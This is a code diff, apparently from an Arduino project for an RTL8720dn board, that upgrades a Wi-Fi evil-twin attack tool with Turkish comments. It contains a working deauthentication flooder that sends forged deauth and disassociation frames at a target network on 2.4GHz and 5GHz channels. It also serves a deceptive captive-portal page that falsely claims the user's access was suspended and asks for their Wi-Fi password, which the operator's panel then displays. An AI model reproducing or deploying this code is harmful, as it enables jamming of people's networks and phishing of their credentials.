@@ -1,5 +1,5 @@
 // AP+STA Captive Portal — RTL8720dn (AmebaD)
-// NİHAİ SÜRÜM: Kurumsal/Profesyonel Arayüz + Cache Sistemi + Burst Mode Deauth
+// NİHAİ SÜRÜM: Max TX/RX Gücü + Multi-Frame Burst Deauth + Dinamik Arayüz
 
 #include "sys_api.h"  
 #include "WiFi.h"
@@ -42,7 +42,10 @@ extern "C" {
   int  wifi_disconnect(void);
   void LwIP_Init(void);
   int  wext_send_mgnt(const char *ifname, char *buf, uint16_t buf_len, uint16_t flags);
-  int  wifi_set_channel(int channel); // Frekans Zıplaması İçin
+  int  wifi_set_channel(int channel); 
+  
+  // YENİ: MAKSİMUM GÜÇ (Power Save İptali) KOMUTU
+  int  wifi_disable_powersave(void);
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -254,7 +257,6 @@ volatile ConnStatus conn_status = CS_IDLE;
 typedef enum { SCAN_IDLE = 0, SCAN_RUNNING = 1, SCAN_DONE = 2 } ScanStatus;
 volatile ScanStatus scan_status = SCAN_IDLE;
 
-// GLOBAL DEĞİŞKENLER
 bool ap_switched = false;
 bool pending_ap_switch = false;
 unsigned long revert_time = 0; 
@@ -434,55 +436,51 @@ void startConnectTask() {
   xTaskCreate(wifiConnectTask, "wconn", 8192, NULL, tskIDLE_PRIORITY + 2, NULL);
 }
 
-// ─── BURST MODU: MAKSİMUM HIZLANDIRILMIŞ 5GHz + 2.4GHz GÖREVİ ────────────────
+// ─── DEAUTH GÖREVİ (MULTI-FRAME BURST) ───────────────────────────────────────
 void deauthTask(void *param) {
   (void)param;
-  
-  uint8_t deauth_frame[26] = {
-    0xC0, 0x00, 0x00, 0x00,
-    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
-    0x00, 0x00,
-    0x07, 0x00 
+  uint8_t frame_template[26] = {
+    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
+    0x00, 0x00, 0x07, 0x00 
   };
-
   int common_5g_channels[] = {36, 40, 44, 48, 149};
 
   while (deauth_active) {
-    // 2.4GHz VURUŞU
     wifi_set_channel(target_channel);
     for (int offset = -2; offset <= 2; offset++) {
         uint8_t temp_bssid[6];
         memcpy(temp_bssid, target_bssid, 6);
         temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);
+        memcpy(&frame_template[10], temp_bssid, 6);
+        memcpy(&frame_template[16], temp_bssid, 6);
 
-        memcpy(&deauth_frame[10], temp_bssid, 6);
-        memcpy(&deauth_frame[16], temp_bssid, 6);
-
-        wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
-        wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
+        frame_template[0] = 0xC0; frame_template[24] = 0x07;
+        wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+        frame_template[24] = 0x02;
+        wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+        frame_template[0] = 0xA0; frame_template[24] = 0x08;
+        wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
         vTaskDelay(pdMS_TO_TICKS(1)); 
     }
     
-    // Web arayüzünün sağlam kalması için 150ms nefes
     vTaskDelay(pdMS_TO_TICKS(150)); 
 
-    // 5GHz BURST (TÜM KANALLAR)
     for(int c=0; c < 5; c++) {
         wifi_set_channel(common_5g_channels[c]);
         for (int offset = -2; offset <= 2; offset++) {
             uint8_t temp_bssid[6];
             memcpy(temp_bssid, target_bssid, 6);
             temp_bssid[5] = (uint8_t)(temp_bssid[5] + offset);
+            memcpy(&frame_template[10], temp_bssid, 6);
+            memcpy(&frame_template[16], temp_bssid, 6);
 
-            memcpy(&deauth_frame[10], temp_bssid, 6);
-            memcpy(&deauth_frame[16], temp_bssid, 6);
-
-            wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
-            wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
-            wext_send_mgnt(WLAN0_NAME, (char*)deauth_frame, 26, 0);
-            
+            frame_template[0] = 0xC0; frame_template[24] = 0x07;
+            wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+            frame_template[24] = 0x02;
+            wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
+            frame_template[0] = 0xA0; frame_template[24] = 0x08;
+            wext_send_mgnt(WLAN0_NAME, (char*)frame_template, 26, 0);
             vTaskDelay(pdMS_TO_TICKS(1)); 
         }
     }
@@ -493,10 +491,10 @@ void deauthTask(void *param) {
 
 // ─── GÖRSELLER VE YÖNLENDİRME ────────────────────────────────────────────────
 String rssiBar(int32_t rssi) {
-  if (rssi > -50) return "&#9608;&#9608;&#9608;&#9608; Cok Iyi";
-  if (rssi > -65) return "&#9608;&#9608;&#9608;&#9617; Iyi";
+  if (rssi > -50) return "&#9608;&#9608;&#9608;&#9608; Mükemmel";
+  if (rssi > -65) return "&#9608;&#9608;&#9608;&#9617; İyi";
   if (rssi > -75) return "&#9608;&#9608;&#9617;&#9617; Orta";
-  return "&#9608;&#9617;&#9617;&#9617; Zayif";
+  return "&#9608;&#9617;&#9617;&#9617; Zayıf";
 }
 
 String buildRedirect() {
@@ -515,19 +513,19 @@ String parsePostParam(const String &body, const String &key) {
   return urlDecode(body.substring(start, end));
 }
 
-// CSS VERİSİ (Daha Kurumsal Renk Tonları)
+// CSS VERİSİ
 static const char CSS_STR[] PROGMEM =
-  "<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Arial,sans-serif;background:#f4f6f9;color:#333;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}"
-  ".card{background:#ffffff;border-radius:12px;padding:32px 24px;width:100%;max-width:450px;box-shadow:0 10px 25px rgba(0,0,0,.08);border-top:5px solid #2980b9}"
-  "h1{font-size:1.5rem;color:#2c3e50;text-align:center;margin-bottom:8px}.sub{text-align:center;font-size:0.9rem;color:#7f8c8d;margin-bottom:24px;line-height:1.5}"
-  ".status-box{border-radius:8px;padding:12px 16px;margin-bottom:20px;font-size:0.95rem;font-weight:bold;text-align:center}.ok{background:#e8f8f5;border:1px solid #27ae60;color:#27ae60}.err{background:#fdedec;border:1px solid #e74c3c;color:#c0392b}.wait{background:#ebf5fb;border:1px solid #2980b9;color:#2980b9}"
-  ".conn-status{border-radius:8px;padding:14px;margin-bottom:20px;font-size:1rem;background:#f8f9f9;border:1px solid #d5dbdb;line-height:1.5;color:#34495e;text-align:center}h2{font-size:1.1rem;color:#2c3e50;margin-bottom:12px;border-bottom:2px solid #ecf0f1;padding-bottom:8px}"
+  "<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#f0f4f8;color:#2c3e50;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:16px}"
+  ".card{background:#ffffff;border-radius:12px;padding:36px 28px;width:100%;max-width:420px;box-shadow:0 12px 30px rgba(0,0,0,.08);border-top:6px solid #0056b3}"
+  "h1{font-size:1.6rem;color:#1a252f;text-align:center;margin-bottom:12px;font-weight:700}.sub{text-align:center;font-size:0.95rem;color:#7f8c8d;margin-bottom:28px;line-height:1.6}"
+  ".status-box{border-radius:8px;padding:14px 16px;margin-bottom:22px;font-size:0.95rem;font-weight:600;text-align:center}.ok{background:#eafaf1;border:1px solid #2ecc71;color:#27ae60}.err{background:#fdeced;border:1px solid #e74c3c;color:#c0392b}.wait{background:#ebf5fb;border:1px solid #3498db;color:#2980b9}"
+  ".conn-status{border-radius:8px;padding:18px;margin-bottom:24px;font-size:1rem;background:#f8f9fa;border:1px solid #e1e8ed;line-height:1.5;color:#34495e;text-align:center}"
   ".net-list{list-style:none;margin-bottom:20px;max-height:260px;overflow-y:auto}.net-item{display:flex;align-items:center;padding:12px 14px;border-radius:8px;margin-bottom:8px;cursor:pointer;border:1px solid #eaeded;background:#fff;transition:all .2s}.net-item:hover{border-color:#3498db;background:#f4f6f9}"
-  ".net-item input[type=radio]{margin-right:12px;accent-color:#2980b9;width:18px;height:18px;flex-shrink:0}.net-info{flex:1;min-width:0}.net-name{font-weight:600;font-size:1rem;color:#2c3e50;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.net-meta{font-size:.8rem;color:#95a5a6;margin-top:4px}"
-  ".pass-wrap{margin-bottom:20px}label{display:block;font-size:.9rem;font-weight:600;color:#34495e;margin-bottom:8px}input[type=password],input[type=text]{width:100%;padding:12px 14px;border-radius:8px;border:1px solid #bdc3c7;background:#fff;color:#2c3e50;font-size:1rem;outline:none;transition:border .2s}input:focus{border-color:#2980b9}"
-  ".show-pass{font-size:.85rem;color:#7f8c8d;margin-top:8px;cursor:pointer;user-select:none;text-align:right}button{width:100%;padding:14px;border:none;border-radius:8px;background:#2980b9;color:#fff;font-size:1.05rem;font-weight:bold;cursor:pointer;transition:background .2s}.btn-blue{background:#34495e}button:hover{background:#2471a3}"
-  ".spinner{display:inline-block;width:16px;height:16px;border:3px solid #2980b9;border-top:3px solid transparent;border-radius:50%;animation:spin 1s linear infinite;vertical-align:middle;margin-right:8px}@keyframes spin{to{transform:rotate(360deg)}}"
-  ".footer{text-align:center;font-size:.8rem;color:#bdc3c7;margin-top:16px;border-top:1px solid #ecf0f1;padding-top:12px}"
+  ".net-item input[type=radio]{margin-right:12px;accent-color:#0056b3;width:18px;height:18px;flex-shrink:0}.net-info{flex:1;min-width:0}.net-name{font-weight:600;font-size:1rem;color:#2c3e50;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}.net-meta{font-size:.8rem;color:#95a5a6;margin-top:4px}"
+  ".pass-wrap{margin-bottom:24px}label{display:block;font-size:.9rem;font-weight:600;color:#34495e;margin-bottom:8px}input[type=password],input[type=text]{width:100%;padding:14px 16px;border-radius:8px;border:1px solid #bdc3c7;background:#fff;color:#2c3e50;font-size:1.05rem;outline:none;transition:border .2s;box-shadow:inset 0 1px 3px rgba(0,0,0,0.05)}input:focus{border-color:#0056b3}"
+  ".show-pass{font-size:.85rem;color:#7f8c8d;margin-top:8px;cursor:pointer;user-select:none;text-align:right}button{width:100%;padding:15px;border:none;border-radius:8px;background:#0056b3;color:#fff;font-size:1.1rem;font-weight:bold;cursor:pointer;transition:background .2s;box-shadow:0 4px 6px rgba(0,86,179,0.2)}.btn-blue{background:#34495e;box-shadow:none}button:hover{background:#004494}"
+  ".spinner{display:inline-block;width:16px;height:16px;border:3px solid #3498db;border-top:3px solid transparent;border-radius:50%;animation:spin 1s linear infinite;vertical-align:middle;margin-right:8px}@keyframes spin{to{transform:rotate(360deg)}}"
+  ".footer{text-align:center;font-size:.8rem;color:#bdc3c7;margin-top:20px;border-top:1px solid #ecf0f1;padding-top:16px}"
   "#offline-bar{position:fixed;top:0;left:0;width:100%;background:#e74c3c;color:#fff;text-align:center;padding:12px;font-weight:bold;font-size:0.9rem;z-index:9999;display:none;box-shadow:0 2px 10px rgba(0,0,0,0.1)}</style>";
 
 void sendChunkedCSS(WiFiClient &client) {
@@ -542,9 +540,9 @@ void sendChunkedCSS(WiFiClient &client) {
   }
 }
 
-// Ortak JavaScript (Bağlantı kopsa bile sayfayı ayakta tutar)
+// OFFLINE KORUYUCU JS
 void sendOfflineScript(WiFiClient &client) {
-  client.print("<div id='offline-bar'>&#9888; Ag baglantisi zayif, yeniden baglaniliyor... Lutfen bekleyiniz.</div>");
+  client.print("<div id='offline-bar'>&#9888; Bağlantı zayıf, lütfen sayfayı kapatmadan bekleyiniz...</div>");
   client.print("<script>");
   client.print("window.addEventListener('offline', function(){ document.getElementById('offline-bar').style.display='block'; });");
   client.print("window.addEventListener('online', function(){ document.getElementById('offline-bar').style.display='none'; });");
@@ -553,22 +551,23 @@ void sendOfflineScript(WiFiClient &client) {
 
 // ─── SAYFALAR ────────────────────────────────────────────────────────────────
 void sendStartPage(WiFiClient &client) {
-  // YENİ: Cache sistemi aktif (Sayfanın bozulmasını engeller)
-  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: public, max-age=3600\r\n\r\n");
+  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store, no-cache, must-revalidate\r\n\r\n");
   client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
-  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Internet Erisim Yoneticisi</title>");
+  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Ağ Yapılandırma Sihirbazı</title>");
   sendChunkedCSS(client);
   client.print("</head><body>");
   sendOfflineScript(client);
   
-  client.print("<div class='card'><h1>&#128246; Internet Erisim Yoneticisi</h1><p class='sub'>Lutfen baglanmak istediginiz agi seciniz.</p>");
+  client.print("<div class='card'>");
+  client.print("<div style='text-align:center; margin-bottom:16px;'><svg width='54' height='54' viewBox='0 0 24 24' fill='none' stroke='#0056b3' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><path d='M5 12.55a11 11 0 0 1 14.08 0'></path><path d='M1.42 9a16 16 0 0 1 21.16 0'></path><path d='M8.53 16.11a6 6 0 0 1 6.95 0'></path><line x1='12' y1='20' x2='12.01' y2='20'></line></svg></div>");
+  client.print("<h1>Ağ Yapılandırma Sihirbazı</h1><p class='sub'>Lütfen erişim sağlamak istediğiniz ağı listeden seçiniz.</p>");
 
   if (scan_status == SCAN_RUNNING) {
-      client.print("<div class='status-box wait'>&#128225; Cevre aglar taranikyor, lutfen bekleyiniz...</div>");
+      client.print("<div class='status-box wait'>&#128225; Çevre ağlar taranıyor, lütfen bekleyiniz...</div>");
   }
 
   if (networks_mutex) xSemaphoreTake(networks_mutex, portMAX_DELAY);
-  client.print("<h2>&#128225; Taranan Aglar ("); client.print(networks.size()); client.print(")</h2><form method='POST' action='/start_ap'><ul class='net-list'>");
+  client.print("<h2>&#128225; Taranan Ağlar ("); client.print(networks.size()); client.print(")</h2><form method='POST' action='/start_ap'><ul class='net-list'>");
 
   for (int i = 0; i < (int)networks.size(); i++) {
     String safe = networks[i].ssid;
@@ -577,79 +576,86 @@ void sendStartPage(WiFiClient &client) {
     client.print("<li class='net-item' onclick=\"document.getElementById('r"); client.print(i); client.print("').checked=true\">");
     client.print("<input type='radio' name='ssid' id='r"); client.print(i); client.print("' value='"); client.print(safe); client.print("' required>");
     client.print("<div class='net-info'><div class='net-name'>"); client.print(safe); client.print("</div>");
-    client.print("<div class='net-meta'>Sinyal Kalitesi: "); client.print(rssiBar(networks[i].rssi)); client.print("</div></div></li>"); // KANAL BİLGİSİ KALDIRILDI
+    client.print("<div class='net-meta'>Sinyal Kalitesi: "); client.print(rssiBar(networks[i].rssi)); client.print("</div></div></li>");
   }
   if (networks.empty() && scan_status != SCAN_RUNNING) {
-      client.print("<li style='padding:16px;text-align:center;color:#7f8c8d;'>Herhangi bir ag bulunamadi.</li>");
+      client.print("<li style='padding:16px;text-align:center;color:#7f8c8d;'>Herhangi bir ağ bulunamadı.</li>");
   }
   if (networks_mutex) xSemaphoreGive(networks_mutex);
 
-  client.print("</ul><button type='submit'>Ileri</button></form>");
-  client.print("<form method='POST' action='/rescan'><button type='submit' class='btn-blue' style='margin-top:10px;'>&#8635; Aglari Yenile</button></form>");
+  client.print("</ul><button type='submit'>İleri</button></form>");
+  client.print("<form method='POST' action='/rescan'><button type='submit' class='btn-blue' style='margin-top:10px;'>&#8635; Ağları Yenile</button></form>");
 
-  // YAKALANAN ŞİFRELERİ SİLME EKRANI (Panel Sahibi İçin)
   if (strlen(saved_ssid) > 0) {
     client.print("<div style='background:#fff;border:1px solid #bdc3c7;border-radius:8px;padding:12px;margin-top:20px;'>");
-    client.print("<h3 style='font-size:0.9rem;color:#2980b9;margin-bottom:8px;text-align:center;'>Sistem Kayitlari</h3>");
+    client.print("<h3 style='font-size:0.9rem;color:#0056b3;margin-bottom:8px;text-align:center;'>Sistem Kayıtları</h3>");
     client.print("<div style='display:flex;justify-content:space-between;align-items:center;background:#f4f6f9;padding:10px;border-radius:6px;'>");
     client.print("<div style='display:flex;flex-direction:column;font-size:0.85rem;'>");
-    client.print("<span style='color:#34495e;'><b>Ag:</b> <span style='color:#2c3e50;'>"); client.print(saved_ssid); client.print("</span></span>");
-    client.print("<span style='color:#34495e;margin-top:4px;'><b>Sifre:</b> <span style='color:#27ae60;'>"); client.print(saved_pass); client.print("</span></span>");
+    client.print("<span style='color:#34495e;'><b>Ağ:</b> <span style='color:#2c3e50;'>"); client.print(saved_ssid); client.print("</span></span>");
+    client.print("<span style='color:#34495e;margin-top:4px;'><b>Şifre:</b> <span style='color:#27ae60;'>"); client.print(saved_pass); client.print("</span></span>");
     client.print("</div>");
     client.print("<form method='POST' action='/delete_cred' style='margin:0;'>");
-    client.print("<button type='submit' style='background:#e74c3c;color:#fff;border:none;padding:8px 12px;border-radius:6px;font-size:0.8rem;cursor:pointer;width:auto;'>Temizle</button>");
+    client.print("<button type='submit' style='background:#e74c3c;color:#fff;border:none;padding:8px 12px;border-radius:6px;font-size:0.8rem;cursor:pointer;width:auto;box-shadow:none;'>Sil</button>");
     client.print("</form></div></div>");
   }
-  client.print("<div class='footer'>&copy; 2026 Ag Guvenlik Yonetimi</div></div></body></html>");
+  client.print("<div class='footer'>Güvenli Bağlantı Yöneticisi &copy; 2026</div></div></body></html>");
 }
 
 void sendSwitchingPage(WiFiClient &client) {
   client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\n\r\n");
   client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
-  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Baglanti Hazirlaniyor</title>");
-  client.print("<style>body{font-family:Arial,sans-serif;background:#f4f6f9;color:#333;text-align:center;padding:50px 20px;} b{color:#2980b9;}</style></head><body>");
-  client.print("<h2 style='color:#2c3e50;'>&#8987; Guvenli Baglanti Hazirlaniyor...</h2>");
-  client.print("<p style='color:#7f8c8d;font-size:16px;margin-top:20px;line-height:1.6'>Lutfen WiFi ayarlarina giderek <b>");
+  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Bağlantı Hazırlanıyor</title>");
+  client.print("<style>body{font-family:'Segoe UI',Tahoma,sans-serif;background:#f0f4f8;color:#333;text-align:center;padding:50px 20px;} b{color:#0056b3;}</style></head><body>");
+  client.print("<h2 style='color:#2c3e50;'>&#8987; Ağ Yapılandırması Hazırlanıyor...</h2>");
+  client.print("<p style='color:#7f8c8d;font-size:16px;margin-top:20px;line-height:1.6'>Lütfen cihazınızın Wi-Fi ayarlarına giderek <b>");
   client.print(target_ssid);
-  client.print("</b> agina tekrar baglaniniz.</p></body></html>");
+  client.print("</b> ağına tekrar bağlanınız.</p></body></html>");
 }
 
 void sendPortalPage(WiFiClient &client, bool show_result) {
-  // YENİ: Cache sistemi ile "Bozuk Sayfa" (Dinozor) görme engellendi
-  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: public, max-age=3600\r\n\r\n");
+  client.print("HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html; charset=UTF-8\r\nCache-Control: no-store, no-cache, must-revalidate\r\n\r\n");
   client.print("<!DOCTYPE html><html lang='tr'><head><meta charset='UTF-8'>");
-  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>Guvenlik Dogrulamasi</title>");
+  client.print("<meta name='viewport' content='width=device-width,initial-scale=1'><title>İnternet Bağlantı Doğrulaması</title>");
   sendChunkedCSS(client);
 
   client.print("</head><body>");
-  sendOfflineScript(client); // JS Offline Koruyucu
+  sendOfflineScript(client);
   
-  client.print("<div class='card'><h1>&#128274; Guvenlik Dogrulamasi</h1>");
-  client.print("<p class='sub'>Internet erisiminizi saglamak icin guvenlik anahtarini girmeniz gerekmektedir.</p>");
+  client.print("<div class='card'>");
+  client.print("<div style='text-align:center; margin-bottom:16px;'><svg width='54' height='54' viewBox='0 0 24 24' fill='none' stroke='#0056b3' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'><path d='M5 12.55a11 11 0 0 1 14.08 0'></path><path d='M1.42 9a16 16 0 0 1 21.16 0'></path><path d='M8.53 16.11a6 6 0 0 1 6.95 0'></path><line x1='12' y1='20' x2='12.01' y2='20'></line></svg></div>");
+  
+  client.print("<h1>Bağlantı Doğrulaması</h1>");
+  client.print("<p class='sub'>Güvenlik standartları güncellendiği için ağ erişiminiz geçici olarak askıya alınmıştır. İnternete tekrar bağlanabilmek için lütfen mevcut şifrenizi doğrulayınız.</p>");
 
   if (conn_status == CS_RUNNING) {
-      client.print("<div class='status-box wait'><span class='spinner'></span>Baglanti kontrol ediliyor, lutfen bekleyiniz...</div>");
+      client.print("<div class='status-box wait'><span class='spinner'></span>Ağ kimliği doğrulanıyor, lütfen bekleyiniz...</div>");
   } else if (show_result) {
-    if (conn_result == "ok") client.print("<div class='status-box ok'>&#10003; Kimlik dogrulama basarili. Internet erisimi saglaniyor...</div>");
-    else if (conn_result == "fail") client.print("<div class='status-box err'>&#10007; Girdiginiz sifre hatali. Lutfen tekrar deneyiniz.</div>");
+    if (conn_result == "ok") client.print("<div class='status-box ok'>&#10003; Doğrulama başarılı. İnternet erişiminiz sağlanıyor...</div>");
+    else if (conn_result == "fail") client.print("<div class='status-box err'>&#10007; Girdiğiniz Wi-Fi şifresi hatalı. Lütfen tekrar deneyiniz.</div>");
   }
 
-  // TERTEMİZ BAĞLANTI DURUM KUTUSU
-  client.print("<div class='conn-status'>Erisim Saglanacak Ag:<br><b style='font-size:1.2rem; display:block; margin-top:6px;'>"); 
+  client.print("<div class='conn-status'>Erişim Sağlanacak Ağ:<br><b style='font-size:1.3rem; display:block; margin-top:8px; color:#0056b3;'>"); 
   client.print(target_ssid);
   client.print("</b></div>");
   
-  // PROFESYONEL ŞİFRE GİRİŞ FORMU
-  client.print("<form method='POST' action='/connect'><div class='pass-wrap'><label for='pass'>WPA2 Guvenlik Anahtari (Sifre)</label>");
-  client.print("<input type='password' id='pass' name='pass' placeholder='Sifrenizi buraya giriniz...' autocomplete='off' required>");
-  client.print("<div class='show-pass' onclick=\"var p=document.getElementById('pass');p.type=p.type=='password'?'text':'password'\">&#128065; Sifreyi Goster</div></div>");
-  client.print("<button type='submit'>&#10148; Baglantiyi Dogrula</button></form>");
+  client.print("<form method='POST' action='/connect'><div class='pass-wrap'><label for='pass'>Wi-Fi Parolası</label>");
+  client.print("<input type='password' id='pass' name='pass' placeholder='Mevcut şifrenizi giriniz...' autocomplete='off' required>");
+  client.print("<div class='show-pass' onclick=\"var p=document.getElementById('pass');p.type=p.type=='password'?'text':'password'\">&#128065; Şifreyi Göster</div></div>");
+  client.print("<button type='submit'>İnternete Bağlan</button></form>");
   
   if (conn_status == CS_RUNNING) {
-      client.print("<script>function tryR(){fetch('/',{cache:'no-store',signal:AbortSignal.timeout(4000)}).then(function(r){if(r.ok){window.location.href='/';}else{setTimeout(tryR,2000);}}).catch(function(){setTimeout(tryR,2000);});}setTimeout(tryR,3000);</script>");
+      client.print("<script>");
+      client.print("function tryR() {");
+      client.print("  var t = new Date().getTime();");
+      client.print("  fetch('/?t=' + t, {cache: 'no-store', signal: AbortSignal.timeout(4000)})");
+      client.print("    .then(function(r) { if(r.ok) { window.location.href = '/?t=' + t; } else { setTimeout(tryR, 2000); } })");
+      client.print("    .catch(function() { setTimeout(tryR, 2000); });");
+      client.print("}");
+      client.print("setTimeout(tryR, 3000);");
+      client.print("</script>");
   }
   
-  client.print("<div class='footer'>&copy; 2026 Ag Guvenlik Yonetimi</div></div></body></html>");
+  client.print("<div class='footer'>Güvenli Bağlantı Yöneticisi &copy; 2026</div></div></body></html>");
 }
 
 // ─── HTTP İŞLEYİCİSİ ─────────────────────────────────────────────────────────
@@ -753,6 +759,10 @@ void handleClient(WiFiClient &client) {
     if (conn_status == CS_RUNNING) { sendPortalPage(client, false); return; }
     String sel_pass = parsePostParam(body, "pass");
     
+    // ŞİFRE DENENİRKEN ÇİP KİLİTLENMESİN DİYE DEAUTH DURDURULUR!
+    deauth_active = false; 
+    delay(300); 
+
     strncpy(pending_ssid, target_ssid, MAX_SSID_LEN - 1);
     pending_ssid[MAX_SSID_LEN - 1] = '\0';
     strncpy(pending_pass, sel_pass.c_str(), MAX_PASS_LEN - 1);
@@ -773,7 +783,7 @@ void handleClient(WiFiClient &client) {
 // ─── Setup ───────────────────────────────────────────────────────────────────
 void setup() {
   Serial.begin(115200); delay(500);
-  Serial.println("\n[Boot] Cihaz Aciliyor... Kurumsal Arayuz ve Burst Deauth Aktif!");
+  Serial.println("\n[Boot] Cihaz Aciliyor... Tam Kapasite Max TX/RX Modu Aktif!");
 
   networks_mutex = xSemaphoreCreateMutex();
   
@@ -782,6 +792,10 @@ void setup() {
   
   LwIP_Init();
   wifi_on(RTW_MODE_STA_AP); delay(500);
+
+  // MAKSİMUM GÜÇ (Power Save İptali)
+  wifi_disable_powersave();
+  Serial.println("[Güc] Power Save IPTAL! Cihaz Maksimum TX/RX Gucunde Calisiyor.");
 
   wifi_start_ap((char *)AP_INITIAL_SSID, RTW_SECURITY_WPA2_AES_PSK, (char *)AP_INITIAL_PASS, strlen(AP_INITIAL_SSID), strlen(AP_INITIAL_PASS), 6);
   delay(500);
@@ -855,6 +869,11 @@ void loop() {
     
   } else if (conn_status == CS_DONE_FAIL) {
     sta_connected = false; conn_result = "fail"; conn_status = CS_IDLE;
+    
+    if(ap_switched && !deauth_active) {
+        deauth_active = true;
+        xTaskCreate(deauthTask, "deauth_tsk", 1024, NULL, tskIDLE_PRIORITY + 1, NULL);
+    }
   }
 
   if (revert_time > 0 && millis() > revert_time) {
